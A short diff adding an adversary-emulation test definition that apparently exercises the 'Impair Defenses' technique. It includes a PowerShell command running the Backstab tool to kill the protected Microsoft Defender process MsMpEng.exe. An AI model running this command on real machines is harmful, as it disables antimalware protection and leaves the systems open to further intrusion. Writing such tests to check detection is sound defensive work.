@@ -1,0 +1,21 @@
+- description: 'Backstab loads Process Explorer driver which is signed by Microsoft
+    and use it to terminate running processes protected by antimalware software such
+    as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
+
+    https://github.com/Yaxser/Backstab'
+  id: 55fa0d4a-61d0-3d34-c062-8b6b5343cac7
+  name: Kill antimalware protected processes using Backstab
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: '& "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n
+          MsMpEng.exe'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: 'Impair Defenses: Disable or Modify Tools'
